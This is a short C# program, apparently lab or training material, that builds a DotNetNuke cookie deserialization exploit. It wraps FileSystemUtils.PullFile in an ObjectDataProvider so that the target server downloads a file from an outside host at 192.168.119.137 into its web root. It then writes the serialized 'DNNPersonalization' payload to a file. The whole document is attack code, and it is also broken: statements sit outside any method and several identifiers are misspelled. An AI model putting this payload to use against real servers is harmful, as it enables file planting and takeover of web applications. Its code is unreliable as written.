using System;
using System.IO;
using System.Xml.Serialization;
using DotNetNuke.Common.Utilities;
using System.Windows.Data;
using System.Collections;

namespace ODPSerializer
{
	class Program
	{
		//Create and ODP object which will wrap a FileSystemUtils Object
		ObjectDataProvider myODP = new ObjectDataProvider();

		//Wrap a FileSystemsUtils Object in ODP
		myODP.ObjectInstance = new FileSystemUtils();

		//Set the MethodNamer Property of the ODP Class
		myODP.MethodName = "PullFile";

		//Set Parameter of  the method
		myODP.MethodParamerts.Add("http://192.168.119.137/PullFileTest.txt");
		myODP.MethodParameters.Add("C:/inetpub/wwwroot/dotnetnuke/PullFileTest.txt");

		//Create a hash table that will be used as the first argument for the serializeDictionary Method
		Hashtable tabe = new Hashtable();
		table["myTableEntry"] = myODP;
		String payload = "; DNNPersonalization=" + XmlUtils.SerialieDictionary(table, "profile");
		TextWriter writer = new StreamWriter("C:\\Users\\Public\\PullFileTest.txt");
		writer.Write(payload);
		Writer.Close();

		Console.WriteLine("Done!");
	}

}
